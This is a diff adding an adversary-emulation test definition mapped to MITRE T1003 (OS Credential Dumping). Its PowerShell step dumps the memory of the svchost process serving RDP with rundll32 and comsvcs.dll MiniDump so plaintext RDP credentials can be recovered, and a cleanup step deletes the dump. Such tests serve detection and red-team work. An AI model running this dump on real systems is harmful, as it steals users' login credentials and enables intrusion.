@@ -1,0 +1,27 @@
+api_version: "2.0"
+name: Dump svchost.exe to gather RDP credentials
+description: |
+    The svchost.exe contains the RDP plain-text credentials.
+    Source: https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/
+
+    Upon successful execution, you should see the following file created $env:TEMP\svchost-exe.dmp.
+uuid: d400090a-d8ca-4be0-982e-c70598a23de9
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1003: OS Credential Dumping'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: dump-svchost.exe-to-gather-rdp-credentials
+      inline: |
+        $ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
+        if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
+        C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full
+      executor: powershell
+      cleanup:
+        inline: |
+            Remove-Item $env:TEMP\svchost-exe.dmp -ErrorAction Ignore
+        executor: powershell
